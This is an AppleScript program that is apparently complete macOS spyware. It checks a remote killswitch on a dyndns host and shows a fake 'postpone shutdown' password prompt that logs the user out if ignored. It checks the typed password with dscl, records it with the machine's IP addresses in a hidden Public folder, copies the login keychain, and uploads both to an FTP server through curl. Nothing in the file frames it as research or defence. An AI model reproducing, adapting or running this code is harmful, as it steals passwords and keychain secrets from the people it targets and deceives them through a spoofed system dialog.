set theuser to do shell script "whoami"
try
	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
	set killswitch to (characters 1 through -1 of result) as text -- Check for Killswitch
	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
		tell application "System Events"
			if login item "Updater" exists then
				delete login item "Updater"
			end if
		end tell
		try
			do shell script "rm -rf ~/public/." & theuser
			do shell script "rm -rf " & (POSIX path of (path to me))
		end try
		return
	end if
end try

try
	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
end try
try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
end try

try
	repeat
		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
		set passwd to text returned of quest
		if gave up of quest = true then -- If the user doesn't enter a password:
			do shell script "killall -u " & theuser -- Shutdown
		end if
		try
			do shell script "dscl . -passwd /Users/" & theuser & " " & passwd & " benwashere"
			do shell script "dscl . -passwd /Users/" & theuser & " benwashere " & passwd & "" -- Check if password is correct
			exit repeat
		on error
			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
		end try
	end repeat
	
	try
		set dte to (current date) as string
		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
		set WANIP to (characters 2 through -1 of result) as text -- Get IP
		set LANIP to (do shell script "ipconfig getifaddr en1")
	on error
		set WANIP to "not connected"
		set LANIP to "not connected"
	end try
	
	try
		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
	end try
	
	set myuser to "<Username>"
	set mypass to "<Password>"
	set myserv to "<ftp address>"
	set mypath to "</path/to/folder/>"
	
	try
		tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".txt -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".txt" -- Upload text file to FTP server
	end try
	
	try
		set china to "~/Library/Keychains/login.keychain"
		do shell script "cp " & china & " " & ufld
		do shell script "mv " & ufld & "login.keychain " & ufld & theuser & ".keychain" -- Copy keychain to hidden folder
	end try
	
	try
		tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".keychain -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".keychain" -- Upload Keychain to FTP server
	end try
	
end try